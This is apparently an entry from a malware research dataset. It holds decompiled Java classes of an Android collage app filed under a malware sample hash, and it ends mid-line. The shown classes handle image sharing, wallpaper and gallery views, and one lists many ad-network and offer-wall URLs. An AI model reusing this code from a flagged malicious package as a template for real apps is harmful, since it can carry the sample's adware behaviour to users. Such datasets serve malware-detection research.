ProgressDialog(ax.this.t);       this.c.setIndeterminate(true);       this.c.setMessage(ax.this.t.getText(R.string.progress_dialog_sharing_image));       this.c.setCancelable(true);       this.c.setOnCancelListener(this);       this.c.show();     }     @Override public void onCancel(    DialogInterface dialogInterface){       this.d=true;     }     @Override public void run(){       try {         a(this.b);       }  catch (      IOException e) {         this.d=true;       }       if (this.d) {         this.d=false;       }       if (this.c.isShowing()) {         this.c.dismiss();       }     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\dev.camera360.collage\ay.code","public class ay {   protected MotionEvent a;   public ay(  MotionEvent motionEvent){     this.a=motionEvent;   }   public static ay a(  MotionEvent motionEvent){     try {       return new f(motionEvent);     }  catch (    VerifyError e) {       return new ay(motionEvent);     }   }   public int b(){     return this.a.getAction();   }   public float c(){     return this.a.getX();   }   public float a(  int i){     d(i);     return c();   }   public float d(){     return this.a.getY();   }   public float b(  int i){     d(i);     return d();   }   public int a(){     return 1;   }   public int c(  int i){     d(i);     return 0;   }   private void d(  int i){     if (i > 0) {       throw new IllegalArgumentException(""Invalid pointer index for Donut/Cupcake"");     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\dev.camera360.collage\b.code","private static class b {   private View a;   private ImageView b=null;   private ProgressBar c=null;   public b(  View view){     this.a=view;   }   public ImageView a(){     if (this.b == null) {       this.b=(ImageView)this.a.findViewById(R.id.image_view);     }     return this.b;   }   public ProgressBar b(){     if (this.c == null) {       this.c=(ProgressBar)this.a.findViewById(R.id.progressBar1);     }     return this.c;   } } public class b extends Thread implements DialogInterface.OnCancelListener {   private String b;   private Bitmap c;   private ProgressDialog d;   private boolean e=false;   public void a(  String str,  Bitmap bitmap) throws IOException {     File file=new File(aa.this.f,BaseActivity.b(str));     if (file.exists()) {       file.delete();     }     FileOutputStream fileOutputStream=new FileOutputStream(file);     bitmap.compress(Bitmap.CompressFormat.JPEG,100,fileOutputStream);     fileOutputStream.flush();     fileOutputStream.close();     aa.this.aj=file.getAbsolutePath();   }   public void b(  String str,  Bitmap bitmap) throws IOException {     if (aa.this.aj.equals("""")) {       a(str,bitmap);     }     if (!aa.this.aj.equals("""")) {       Intent intent=new Intent(""android.intent.action.SEND"");       Uri parse=Uri.parse(""file://"" + aa.this.aj);       intent.putExtra(""android.intent.extra.SUBJECT"","""");       intent.putExtra(""android.intent.extra.TEXT"","""");       intent.putExtra(""android.intent.extra.STREAM"",parse);       intent.setType(""image/jpeg"");       aa.this.g.startActivity(Intent.createChooser(intent,""Share Image""));     }   }   public b(  String str,  Bitmap bitmap){     this.b=str;     this.c=bitmap;     this.d=new ProgressDialog(aa.this.g);     this.d.setIndeterminate(true);     this.d.setMessage(aa.this.g.getText(R.string.progress_dialog_sharing_image));     this.d.setCancelable(true);     this.d.setOnCancelListener(this);     this.d.show();   }   @Override public void onCancel(  DialogInterface dialogInterface){     this.e=true;   }   @Override public void run(){     try {       b(this.b,this.c);     }  catch (    IOException e) {       this.e=true;     }     if (this.e) {       this.e=false;     }     if (this.d.isShowing()) {       this.d.dismiss();     }     aa.this.B.setDrawingCacheEnabled(false);     a(new File(aa.this.aj));     aa.this.dismiss();   }   public void a(  File file){     Uri fromFile=Uri.fromFile(file);     Intent intent=new Intent(""android.intent.action.MEDIA_SCANNER_SCAN_FILE"");     intent.setData(fromFile);     aa.this.g.sendBroadcast(intent);   } } public class b extends BaseAdapter {   int a;   private Context c;   private ArrayList<c> d=new ArrayList<>();   private int e;   public b(  Context context,  int i){     this.c=context;     this.a=i;     TypedArray obtainStyledAttributes=ai.this.b.obtainStyledAttributes(R.styleable.Gallery1);     this.e=obtainStyledAttributes.getResourceId(0,0);     obtainStyledAttributes.recycle();   }   public void a(){     this.d.clear();   }   public void a(  c cVar){     this.d.add(cVar);   }   @Override public int getCount(){     return this.d.size();   }   @Override public Object getItem(  int i){     return this.d.get(i);   }   @Override public long getItemId(  int i){     return i;   }   @Override public View getView(  int i,  View view,  ViewGroup viewGroup){     ImageView imageView=new ImageView(ai.this.b);     c cVar=this.d.get(i);     imageView.setImageBitmap(cVar.a());     imageView.setTag(cVar.b());     imageView.setScaleType(ImageView.ScaleType.FIT_XY);     imageView.setLayoutParams(new Gallery.LayoutParams(dev.camera360.collage.a.b.a(ai.this.b.getResources(),70),dev.camera360.collage.a.b.a(ai.this.b.getResources(),50)));     imageView.setBackgroundResource(this.e);     return imageView;   } } public class b extends BaseAdapter {   int a;   private Context c;   private ArrayList<d> d=new ArrayList<>();   private int e;   public b(  Context context,  int i){     this.c=context;     this.a=i;     TypedArray obtainStyledAttributes=aj.this.k.obtainStyledAttributes(R.styleable.Gallery1);     this.e=obtainStyledAttributes.getResourceId(0,0);     obtainStyledAttributes.recycle();   }   public void a(){     this.d.clear();   }   public void a(  d dVar){     this.d.add(dVar);   }   @Override public int getCount(){     return this.d.size();   }   @Override public Object getItem(  int i){     return this.d.get(i);   }   @Override public long getItemId(  int i){     return i;   }   @Override public View getView(  int i,  View view,  ViewGroup viewGroup){     ImageView imageView=new ImageView(aj.this.k);     d dVar=this.d.get(i);     imageView.setImageBitmap(dVar.a());     imageView.setTag(dVar.b());     imageView.setScaleType(ImageView.ScaleType.FIT_XY);     imageView.setLayoutParams(new Gallery.LayoutParams(dev.camera360.collage.a.b.a(aj.this.k.getResources(),80),dev.camera360.collage.a.b.a(aj.this.k.getResources(),80)));     imageView.setBackgroundResource(this.e);     return imageView;   } } public class b extends BaseAdapter {   private Context b;   private ArrayList<ao> c;   public ArrayList<ao> a(){     return this.c;   }   public b(  Context context,  ArrayList<ao> arrayList){     this.b=context;     this.c=arrayList;   }   @Override public int getCount(){     return this.c.size();   }   @Override public Object getItem(  int i){     return Integer.valueOf(i);   }   @Override public long getItemId(  int i){     return i;   }   @Override public View getView(  int i,  View view,  ViewGroup viewGroup){     ImageView imageView=new ImageView(this.b);     if (this.c.get(i).d != null) {       imageView.setImageBitmap(this.c.get(i).d);       imageView.setLayoutParams(new AbsListView.LayoutParams(85,85));     }  else {       imageView.setImageDrawable(an.this.a.getResources().getDrawable(android.R.color.black));     }     return imageView;   } } public class b extends Thread implements DialogInterface.OnCancelListener {   private String b;   private ProgressDialog c;   private boolean d=false;   public b(  String str){     this.b=str;     this.c=new ProgressDialog(at.this.e);     this.c.setIndeterminate(true);     this.c.setMessage(at.this.e.getText(R.string.progress_dialog_setting_wallpaper));     this.c.setCancelable(true);     this.c.setOnCancelListener(this);     this.c.show();   }   @Override public void onCancel(  DialogInterface dialogInterface){     this.d=true;   }   @Override public void run(){     Drawable wallpaper=at.this.e.getWallpaper();     try {       at.this.e.setWallpaper(BitmapFactory.decodeFile(this.b,new BitmapFactory.Options()));     }  catch (    IOException e) {       this.d=true;     }     if (this.d) {       int intrinsicWidth=wallpaper.getIntrinsicWidth();       int intrinsicHeight=wallpaper.getIntrinsicHeight();       Bitmap createBitmap=Bitmap.createBitmap(intrinsicWidth,intrinsicHeight,Bitmap.Config.RGB_565);       Canvas canvas=new Canvas(createBitmap);       wallpaper.setBounds(0,0,intrinsicWidth,intrinsicHeight);       wallpaper.draw(canvas);       try {         at.this.e.setWallpaper(createBitmap);       }  catch (      IOException e2) {       }       this.d=false;     }     if (this.c.isShowing()) {       this.c.dismiss();     }   } } public class b extends Thread implements DialogInterface.OnCancelListener {   private String b;   private ProgressDialog c;   private boolean d=false;   public b(  String str){     this.b=str;     this.c=new ProgressDialog(au.this.f);     this.c.setIndeterminate(true);     this.c.setMessage(au.this.f.getText(R.string.progress_dialog_setting_wallpaper));     this.c.setCancelable(true);     this.c.setOnCancelListener(this);     this.c.show();   }   @Override public void onCancel(  DialogInterface dialogInterface){     this.d=true;   }   @Override public void run(){     Drawable wallpaper=au.this.f.getWallpaper();     File file=new File(this.b);     try {       Intent intent=new Intent(""android.intent.action.ATTACH_DATA"");       intent.setDataAndType(Uri.fromFile(file),""image/*"");       au.this.f.startActivity(intent);     }  catch (    Exception e) {       this.d=true;     }     if (this.d) {       int intrinsicWidth=wallpaper.getIntrinsicWidth();       int intrinsicHeight=wallpaper.getIntrinsicHeight();       Bitmap createBitmap=Bitmap.createBitmap(intrinsicWidth,intrinsicHeight,Bitmap.Config.RGB_565);       Canvas canvas=new Canvas(createBitmap);       wallpaper.setBounds(0,0,intrinsicWidth,intrinsicHeight);       wallpaper.draw(canvas);       try {         au.this.f.setWallpaper(createBitmap);       }  catch (      IOException e2) {       }       this.d=false;     }     if (this.c.isShowing()) {       this.c.dismiss();     }   } } public class b extends Thread implements DialogInterface.OnCancelListener {   private String b;   private ProgressDialog c;   private boolean d=false;   public void a(  File file,  File file2) throws IOException {     FileInputStream fileInputStream=new FileInputStream(file);     FileOutputStream fileOutputStream=new FileOutputStream(file2);     byte[] bArr=new byte[android.support.v4.view.a.a.ACTION_NEXT_HTML_ELEMENT];     while (true) {       int read=fileInputStream.read(bArr);       if (read > 0) {         fileOutputStream.write(bArr,0,read);       }  else {         fileInputStream.close();         fileOutputStream.close();         return;       }     }   }   public void a(  String str) throws IOException {     File file=new File(str);     String substring=str.substring(str.lastIndexOf(""."") + 1);     if (substring.toLowerCase().equals(BaseActivity.EXTENSION2)) {       Intent intent=new Intent(""android.intent.action.SEND"");       Uri parse=Uri.parse(""file://"" + file.getAbsolutePath());       intent.putExtra(""android.intent.extra.SUBJECT"","""");       intent.putExtra(""android.intent.extra.TEXT"","""");       intent.putExtra(""android.intent.extra.STREAM"",parse);       intent.setType(""image/jpeg"");       aw.this.s.startActivity(Intent.createChooser(intent,""Share Image""));       return;     }     if (substring.toLowerCase().equals(""png"")) {       Intent intent2=new Intent(""android.intent.action.SEND"");       Uri parse2=Uri.parse(""file://"" + file.getAbsolutePath());       intent2.putExtra(""android.intent.extra.SUBJECT"","""");       intent2.putExtra(""android.intent.extra.TEXT"","""");       intent2.putExtra(""android.intent.extra.STREAM"",parse2);       intent2.setType(""image/png"");       aw.this.s.startActivity(Intent.createChooser(intent2,""Share Image""));       return;     }     File file2=new File(aw.this.h,BaseActivity.a(str));     if (file2.exists()) {       file2.delete();     }     a(file,file2);     Intent intent3=new Intent(""android.intent.action.SEND"");     Uri parse3=Uri.parse(""file://"" + file2.getAbsolutePath());     intent3.putExtra(""android.intent.extra.SUBJECT"","""");     intent3.putExtra(""android.intent.extra.TEXT"","""");     intent3.putExtra(""android.intent.extra.STREAM"",parse3);     intent3.setType(""image/jpeg"");     aw.this.s.startActivity(Intent.createChooser(intent3,""Share Image""));     try {       file2.deleteOnExit();     }  catch (    Exception e) {       file2.delete();     }   }   public b(  String str){     this.b=str;     this.c=new ProgressDialog(aw.this.s);     this.c.setIndeterminate(true);     this.c.setMessage(aw.this.s.getText(R.string.progress_dialog_sharing_image));     this.c.setCancelable(true);     this.c.setOnCancelListener(this);     this.c.show();   }   @Override public void onCancel(  DialogInterface dialogInterface){     this.d=true;   }   @Override public void run(){     try {       a(this.b);     }  catch (    IOException e) {       this.d=true;     }     if (this.d) {       this.d=false;     }     if (this.c.isShowing()) {       this.c.dismiss();     }   } } public class b extends Thread implements DialogInterface.OnCancelListener {   private String b;   private ProgressDialog c;   private boolean d=false;   public void a(  File file,  File file2) throws IOException {     FileInputStream fileInputStream=new FileInputStream(file);     FileOutputStream fileOutputStream=new FileOutputStream(file2);     byte[] bArr=new byte[android.support.v4.view.a.a.ACTION_NEXT_HTML_ELEMENT];     while (true) {       int read=fileInputStream.read(bArr);       if (read > 0) {         fileOutputStream.write(bArr,0,read);       }  else {         fileInputStream.close();         fileOutputStream.close();         return;       }     }   }   public void a(  String str) throws IOException {     File file=new File(ax.this.i,str);     String substring=str.substring(str.lastIndexOf(""."") + 1);     if (substring.toLowerCase().equals(BaseActivity.EXTENSION2)) {       Intent intent=new Intent(""android.intent.action.SEND"");       Uri parse=Uri.parse(""file://"" + file.getAbsolutePath());       intent.putExtra(""android.intent.extra.SUBJECT"","""");       intent.putExtra(""android.intent.extra.TEXT"","""");       intent.putExtra(""android.intent.extra.STREAM"",parse);       intent.setType(""image/jpeg"");       ax.this.t.startActivity(Intent.createChooser(intent,""Share Image""));       return;     }     if (substring.toLowerCase().equals(""png"")) {       Intent intent2=new Intent(""android.intent.action.SEND"");       Uri parse2=Uri.parse(""file://"" + file.getAbsolutePath());       intent2.putExtra(""android.intent.extra.SUBJECT"","""");       intent2.putExtra(""android.intent.extra.TEXT"","""");       intent2.putExtra(""android.intent.extra.STREAM"",parse2);       intent2.setType(""image/png"");       ax.this.t.startActivity(Intent.createChooser(intent2,""Share Image""));       return;     }     File file2=new File(ax.this.h,BaseActivity.a(str));     if (file2.exists()) {       file2.delete();     }     a(file,file2);     Intent intent3=new Intent(""android.intent.action.SEND"");     Uri parse3=Uri.parse(""file://"" + file2.getAbsolutePath());     intent3.putExtra(""android.intent.extra.SUBJECT"","""");     intent3.putExtra(""android.intent.extra.TEXT"","""");     intent3.putExtra(""android.intent.extra.STREAM"",parse3);     intent3.setType(""image/jpeg"");     ax.this.t.startActivity(Intent.createChooser(intent3,""Share Image""));     try {       file2.deleteOnExit();     }  catch (    Exception e) {       file2.delete();     }   }   public b(  String str){     this.b=str;     this.c=new ProgressDialog(ax.this.t);     this.c.setIndeterminate(true);     this.c.setMessage(ax.this.t.getText(R.string.progress_dialog_sharing_image));     this.c.setCancelable(true);     this.c.setOnCancelListener(this);     this.c.show();   }   @Override public void onCancel(  DialogInterface dialogInterface){     this.d=true;   }   @Override public void run(){     try {       a(this.b);     }  catch (    IOException e) {       this.d=true;     }     if (this.d) {       this.d=false;     }     if (this.c.isShowing()) {       this.c.dismiss();     }   } } !org.eclipse.jdt.core.dom.TypeDeclaration@1ef9f3abprotected class b extends AsyncTask<Void,Void,Void> {   public String a;   protected b(){   }   @Override public Void doInBackground(  Void... voidArr){     try {       Thread.sleep(100L);       return null;     }  catch (    InterruptedException e) {       Log.d(""MyPlugin"",""RestartTask received an InterruptedException"");       return null;     }   }   @Override public void onPostExecute(  Void r4){     super.onPostExecute(r4);     Intent launchIntentForPackage=Cam360AlbumActivity.this.getPackageManager().getLaunchIntentForPackage(this.a);     if (launchIntentForPackage != null) {       launchIntentForPackage.addFlags(67108864);       Cam360AlbumActivity.this.startActivity(launchIntentForPackage);     }  else {       String str=""market://details?id="" + this.a;       Intent intent=new Intent(""android.intent.action.VIEW"");       intent.setData(Uri.parse(str));       Cam360AlbumActivity.this.startActivity(intent);     }   } } public interface b {   void a(); } public class b extends Thread {   p a;   c b;   public b(  p pVar,  c cVar){     this.a=pVar;     this.b=cVar;   }   @Override public void run(){     if (this.a.a() == null) {       this.a.a(i.a(this.a));     }     Bitmap a=this.a.a();     if (this.a.a() != null) {       Message obtain=Message.obtain(this.b,1);       obtain.obj=a;       this.b.sendMessage(obtain);     }   } } private static class b {   private View a;   private ImageView b=null;   private ProgressBar c=null;   public b(  View view){     this.a=view;   }   public ImageView a(){     if (this.b == null) {       this.b=(ImageView)this.a.findViewById(R.id.image_view);     }     return this.b;   }   public ProgressBar b(){     if (this.c == null) {       this.c=(ProgressBar)this.a.findViewById(R.id.progressBar1);     }     return this.c;   } } private static class b {   private View a;   private ImageView b=null;   private ProgressBar c=null;   public b(  View view){     this.a=view;   }   public ImageView a(){     if (this.b == null) {       this.b=(ImageView)this.a.findViewById(R.id.image_view);     }     return this.b;   }   public ProgressBar b(){     if (this.c == null) {       this.c=(ProgressBar)this.a.findViewById(R.id.progressBar1);     }     return this.c;   } } private static class b {   private View a;   private ImageView b=null;   private ProgressBar c=null;   public b(  View view){     this.a=view;   }   public ImageView a(){     if (this.b == null) {       this.b=(ImageView)this.a.findViewById(R.id.image_view);     }     return this.b;   }   public ProgressBar b(){     if (this.c == null) {       this.c=(ProgressBar)this.a.findViewById(R.id.progressBar1);     }     return this.c;   } } protected class b extends AsyncTask<Void,Void,Void> {   public String a;   public String b;   protected b(){   }   @Override public Void doInBackground(  Void... voidArr){     try {       Thread.sleep(100L);       return null;     }  catch (    InterruptedException e) {       Log.d(""MyPlugin"",""RestartTask received an InterruptedException"");       return null;     }   }   @Override public void onPostExecute(  Void r4){     super.onPostExecute(r4);     Intent launchIntentForPackage=MomentcamGalleryActivity.this.getPackageManager().getLaunchIntentForPackage(this.a);     if (launchIntentForPackage != null) {       launchIntentForPackage.putExtra(""caller"",this.b);       launchIntentForPackage.addFlags(67108864);       MomentcamGalleryActivity.this.startActivity(launchIntentForPackage);     }  else {       String str=""market://details?id="" + this.a;       Intent intent=new Intent(""android.intent.action.VIEW"");       intent.setData(Uri.parse(str));       MomentcamGalleryActivity.this.startActivity(intent);     }   } } private static class b {   private View a;   private ImageView b=null;   private ProgressBar c=null;   public b(  View view){     this.a=view;   }   public ImageView a(){     if (this.b == null) {       this.b=(ImageView)this.a.findViewById(R.id.image_view);     }     return this.b;   }   public ProgressBar b(){     if (this.c == null) {       this.c=(ProgressBar)this.a.findViewById(R.id.progressBar1);     }     return this.c;   } } private static class b {   private View a;   private ImageView b=null;   private ImageButton c=null;   private ProgressBar d=null;   public b(  View view){     this.a=view;   }   public ImageView a(){     if (this.b == null) {       this.b=(ImageView)this.a.findViewById(R.id.image_view);     }     return this.b;   }   public ProgressBar b(){     if (this.d == null) {       this.d=(ProgressBar)this.a.findViewById(R.id.progressBar1);     }     return this.d;   }   public ImageButton c(){     if (this.c == null) {       this.c=(ImageButton)this.a.findViewById(R.id.delete_button);     }     return this.c;   } } protected class b extends AsyncTask<Void,Void,Void> {   public String a;   public String b;   protected b(){   }   @Override public Void doInBackground(  Void... voidArr){     try {       Thread.sleep(100L);       return null;     }  catch (    InterruptedException e) {       Log.d(""MyPlugin"",""RestartTask received an InterruptedException"");       return null;     }   }   @Override public void onPostExecute(  Void r4){     super.onPostExecute(r4);     Intent launchIntentForPackage=TabSample.this.getPackageManager().getLaunchIntentForPackage(this.a);     if (launchIntentForPackage != null) {       launchIntentForPackage.putExtra(""caller"",this.b);       launchIntentForPackage.addFlags(67108864);       TabSample.this.startActivity(launchIntentForPackage);     }  else {       String str=""market://details?id="" + this.a;       Intent intent=new Intent(""android.intent.action.VIEW"");       intent.setData(Uri.parse(str));       TabSample.this.startActivity(intent);     }   } } public class b extends AsyncTask<Object,c,Object> {   private boolean d=false;   ArrayList a=new ArrayList();   String b=String.valueOf(Environment.getExternalStorageDirectory().getAbsolutePath()) + ""/data/photoframes/loveframes/frames/"";   b(){   }   public void a(){     String[] strArr;     File file=new File(this.b);     if (file.exists()) {       strArr=file.list(new FilenameFilter(){         @Override public boolean accept(        File file2,        String str){           return str.endsWith("".frm"") || new File(file2,str).isDirectory();         }       } );     }  else {       strArr=new String[0];     }     for (    String str : strArr) {       this.a.add(str);     }   }   @Override protected Object doInBackground(  Object... objArr){     a();     int size=this.a.size();     v.this.k=size;     v.this.j=0;     BitmapFactory.Options options=new BitmapFactory.Options();     options.inSampleSize=5;     options.inDither=false;     options.inPurgeable=true;     options.inInputShareable=true;     options.inTempStorage=new byte[16384];     for (int i=0; i < size; i++) {       String obj=this.a.get(i).toString();       File file=new File(this.b,obj);       String absolutePath=file.getAbsolutePath();       Bitmap decodeFile=BitmapFactory.decodeFile(file.toString(),options);       if (decodeFile != null) {         Bitmap createScaledBitmap=Bitmap.createScaledBitmap(decodeFile,dev.camera360.collage.a.b.a(v.this.i.getResources(),100),dev.camera360.collage.a.b.a(v.this.i.getResources(),80),true);         decodeFile.recycle();         if (createScaledBitmap != null) {           publishProgress(new c(createScaledBitmap,0,absolutePath,obj,"""",""""));         }       }       if (this.d) {         return null;       }     }     return null;   }   public void b(){     this.d=true;   }   @Override public void onProgressUpdate(  c... cVarArr){     v.this.a(cVarArr);   }   @Override protected void onPostExecute(  Object obj){     if (this.d) {       v.this.v.a();     }   } } public class b extends BaseAdapter {   int a;   private Context c;   private ArrayList<f> d=new ArrayList<>();   private int e;   public b(  Context context,  int i){     this.c=context;     this.a=i;     TypedArray obtainStyledAttributes=x.this.D.obtainStyledAttributes(R.styleable.Gallery1);     this.e=obtainStyledAttributes.getResourceId(0,0);     obtainStyledAttributes.recycle();   }   public void a(){     this.d.clear();   }   public void a(  f fVar){     this.d.add(fVar);   }   @Override public int getCount(){     return this.d.size();   }   @Override public Object getItem(  int i){     return this.d.get(i);   }   @Override public long getItemId(  int i){     return i;   }   @Override public View getView(  int i,  View view,  ViewGroup viewGroup){     ImageView imageView=new ImageView(x.this.D);     f fVar=this.d.get(i);     imageView.setImageBitmap(fVar.a());     imageView.setTag(fVar.b());     imageView.setScaleType(ImageView.ScaleType.FIT_XY);     imageView.setLayoutParams(new Gallery.LayoutParams(dev.camera360.collage.a.b.a(x.this.D.getResources(),80),dev.camera360.collage.a.b.a(x.this.D.getResources(),80)));     imageView.setBackgroundResource(this.e);     return imageView;   } } public class b extends BaseAdapter {   int a;   private Context c;   private ArrayList<d> d=new ArrayList<>();   private int e;   public b(  Context context,  int i){     this.c=context;     this.a=i;     TypedArray obtainStyledAttributes=z.this.k.obtainStyledAttributes(R.styleable.Gallery1);     this.e=obtainStyledAttributes.getResourceId(0,0);     obtainStyledAttributes.recycle();   }   public void a(){     this.d.clear();   }   public void a(  d dVar){     this.d.add(dVar);   }   @Override public int getCount(){     return this.d.size();   }   @Override public Object getItem(  int i){     return this.d.get(i);   }   @Override public long getItemId(  int i){     return i;   }   @Override public View getView(  int i,  View view,  ViewGroup viewGroup){     ImageView imageView=new ImageView(z.this.k);     d dVar=this.d.get(i);     imageView.setImageBitmap(dVar.a());     imageView.setTag(dVar.b());     imageView.setScaleType(ImageView.ScaleType.FIT_XY);     imageView.setLayoutParams(new Gallery.LayoutParams(dev.camera360.collage.a.b.a(z.this.k.getResources(),80),dev.camera360.collage.a.b.a(z.this.k.getResources(),80)));     imageView.setBackgroundResource(this.e);     return imageView;   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\dev.camera360.collage\BaseActivity.code","public class BaseActivity extends Activity {   public static final int ACTIVITY_PREFERENCE=1;   public static final String ADPROMPT_ZONE_ID=""9584"";   public static final int ADS_ADMOB=2;   public static final int ADS_DURATION_SECOND=60;   public static final int ADS_FIRST_MILLI_SECOND=1000;   public static final int ADS_SCHEDULE_MILLI_SECOND=12000;   public static final int ADS_SOMA=1;   public static final int ADS_SOMA_REFRESH_SECOND=15;   public static final int ADS_START_MILLI_SECOND=0;   public static final String AIS=""http://s3.amazonaws.com/adrollo-custom-images/0fe635943710009e914e0bdcb0f3b309.jpg"";   public static final String AIS_URL=""market://details?id=com.quickcall.ais"";   public static final int ANIMATION_TIME=360;   public static final int BACKGROUND_GALLERY_RESULT=20;   public static final String BESTYOUTUBE=""http://s3.amazonaws.com/adrollo-custom-images/c4e391f15f900f9c2fa7c2ddb6653c70.jpg"";   public static final String BESTYOUTUBE_URL=""market://details?id=com.js.bestyoutube"";   public static final int BIG_SIZE=50;   public static final int BOOKMARK_LIMIT=50;   public static final int BROWSER_MENU_DURATION=3000;   public static final int BROWSER_SEARCH_TYPE_EXTRA1=20;   public static final int BROWSER_SEARCH_TYPE_EXTRA2=30;   public static final int BROWSER_SEARCH_TYPE_GENERAL=10;   public static final int CAMERA_RESULT=40;   public static final int COLOR_BLACK=5;   public static final int COLOR_BLUE=1;   public static final int COLOR_GREEN=0;   public static final int COLOR_ORANGE=3;   public static final int COLOR_RED=4;   public static final int COLOR_YELLOW=2;   public static final int CONNECTION_MOBILE=1;   public static final int CONNECTION_NO_CONNECTION=0;   public static final int CONNECTION_WIFI=2;   public static final boolean DEBUG=false;   public static final int DEFAULT_PAGESIZE2=12;   public static final int DEFAULT_PAGESIZE3=18;   public static final int DEFAULT_TEXTSIZE=30;   public static final int DEFAULT_XSPACING=0;   public static final int DEFAULT_YSPACING=0;   public static final int DIALOG_18_OLDER=4;   public static final int DIALOG_ADS_NOT_COMPLETE=5;   public static final int DIALOG_CONFIRM=7;   public static final int DIALOG_ENABLE_WIFI=3;   public static final int DIALOG_HELP_ENG=1;   public static final int DIALOG_HELP_THAI=2;   public static final int DIALOG_MORE_APP=6;   public static final boolean DOWNLOAD=true;   public static final String DTAC=""http://s3.amazonaws.com/adrollo-custom-images/87db43bdd2fa2fa7b2f40f7f02705ab1.jpg"";   public static final String DTAC_URL=""market://details?id=com.quickcall.dtac"";   public static final int EDITOR_RESULT=30;   public static final int EDIT_GALLERY_RESULT=50;   public static final String EVERBADGE_URL=""http://best-android-apps.mobi/1266"";   public static final int EXPIRED_DURATION_HOUR=1;   public static final int EXPIRED_DURATION_HOUR2=1;   public static final int EXPIRED_DURATION_HOUR3=1;   public static final int EXPIRED_DURATION_HOUR4=1;   public static final int EXPIRED_DURATION_HOUR5=1;   public static final int EXPIRED_DURATION_HOUR6=1;   public static final int EXPIRED_DURATION_HOUR7=1;   public static final int EXPIRED_DURATION_HOUR8=1;   public static final int EXPIRED_DURATION_MINUTE=1;   public static final String EXTENSION="""";   public static final String EXTENSION2=""jpg"";   public static final int GALLERY_RESULT=10;   public static final int GAP_DURATION_MINUTE=1;   public static final int GAP_DURATION_MINUTE2=1;   public static final int GAP_DURATION_SECOND=30;   public static final String GTOFFERS_URL=""http://apps.gtoffers.com/entry.php?p=g266352vv1"";   public static final String KEY_CHANGELOG_VERSION_VIEWED=""KEY_CHANGELOG_VERSION_VIEWED"";   public static final String LEADBOLT_APPWALL_URL=""http://ad.leadboltads.net/show_app_wall?section_id=645986826"";   public static final String LEADBOLT_URL=""http://ad.leadboltads.net/show_app_ad.js?section_id=380113127"";   public static final int MAX_TEXTSIZE=100;   public static final int MAX_XSPACING=100;   public static final int MAX_YSPACING=100;   public static final int MEDIUM_SIZE=50;   public static final int MENU_ADDBOOKMARK=14;   public static final int MENU_ADD_IMAGE=31;   public static final int MENU_BACK=8;   public static final int MENU_CANCEL=32;   public static final int MENU_CAPTURE=9;   public static final int MENU_CLEAR_NOTIFICATION=23;   public static final int MENU_COPY=12;   public static final int MENU_DELETE_BOOKMARK=13;   public static final int MENU_DISMISS=11;   public static final int MENU_DOWNLOAD=21;   public static final int MENU_DRAWING_FEATURE=29;   public static final int MENU_EXIT=100;   public static final int MENU_GADET_REMOVE=44;   public static final int MENU_GADGET_CANCEL=45;   public static final int MENU_GALLERY=16;   public static final int MENU_GOTO=10;   public static final int MENU_HELP=22;   public static final int MENU_HOWTO1=24;   public static final int MENU_HOWTO2=25;   public static final int MENU_HOWTO3=42;   public static final int MENU_HOWTO4=43;   public static final int MENU_MORE_APP=7;   public static final int MENU_NEW_FEATURE=28;   public static final int MENU_PREFERENCE=6;   public static final int MENU_RATE_APP=30;   public static final int MENU_RELOAD=15;   public static final int MENU_REMOVE=18;   public static final int MENU_RESET=5;   public static final int MENU_SEARCH=1;   public static final int MENU_SHARE=17;   public static final int MENU_UPDATE_BOOKMARK=19;   public static final int MENU_UPDATE_THUMBNAIL=20;   public static final int MENU_VIEW_GALLERY=26;   public static final int MENU_VIEW_LIST=27;   public static final String MIKANDI_URL=""http://www.mikandi.com/publisher_apps?publisher_id=904829"";   public static final int MIN_BUBBLE_HEIGHT=20;   public static final String NEW_WIFI_FOUND=""NEW_WIFI_FOUND"";   public static final String PARENT_FOLDER=""MomanCamera"";   public static final String PARENT_FOLDER2=""ManbokerShare"";   public static final String PARENT_FOLDER3=""Cam360Editor"";   public static final String PREF_18_OLDER=""PREF_18_OLDER"";   public static final String PREF_BACKGROUND_LAYOUT=""PREF_BACKGROUND_LAYOUT"";   public static final String PREF_BORDER_COLOR=""PREF_BORDER_COLOR"";   public static final String PREF_BORDER_WIDTH=""PREF_BORDER_WIDTH"";   public static final String PREF_CATEGORY_TOP_YOUTUBE=""PREF_CATEGORY_TOP_YOUTUBE"";   public static final String PREF_CHECK_RATE=""PREF_CHECK_RATE"";   public static final String PREF_CHECK_UPDATE=""PREF_CHECK_UPDATE"";   public static final String PREF_CONNECTION_STATUS=""PREF_CONNECTION_STATUS"";   public static final String PREF_COUNTRY_TOP_YOUTUBE=""PREF_COUNTRY_TOP_YOUTUBE"";   public static final String PREF_CURRENT_VIEW=""PREF_CURRENT_VIEW"";   public static final String PREF_CUSTOM_BORDER_COLOR=""PREF_CUSTOM_BORDER_COLOR"";   public static final String PREF_CUSTOM_COLOR1=""PREF_CUSTOM_COLOR1"";   public static final String PREF_CUSTOM_COLOR2=""PREF_CUSTOM_COLOR2"";   public static final String PREF_FEED_TOP_YOUTUBE=""PREF_FEED_TOP_YOUTUBE"";   public static final String PREF_FILE_TYPE=""PREF_FILE_TYPE"";   public static final String PREF_HIDE_DIALOG=""PREF_HIDE_DIALOG"";   public static final String PREF_IMAGE_PATH=""PREF_IMAGE_PATH"";   public static final String PREF_KEYWORDS=""PREF_KEYWORDS"";   public static final String PREF_KEYWORDS_TOP_YOUTUBE=""PREF_KEYWORDS_TOP_YOUTUBE"";   public static final String PREF_KEYWORDS_YOUTUBE=""PREF_KEYWORDS_YOUTUBE"";   public static final String PREF_KEYWORD_TYPE=""PREF_KEYWORD_TYPE"";   public static final String PREF_KEYWORD_TYPE_YOUTUBE=""PREF_KEYWORD_TYPE_YOUTUBE"";   public static final String PREF_LAST_ADS=""PREF_LAST_ADS"";   public static final String PREF_LAST_DISPLAY_ADS=""PREF_LAST_DISPLAY_ADS"";   public static final String PREF_LAST_DISPLAY_ADS2=""PREF_LAST_DISPLAY_ADS2"";   public static final String PREF_LAST_DISPLAY_ADS3=""PREF_LAST_DISPLAY_ADS3"";   public static final String PREF_LAST_OFFER=""PREF_LAST_OFFER"";   public static final String PREF_LAST_OFFER2=""PREF_LAST_OFFER2"";   public static final String 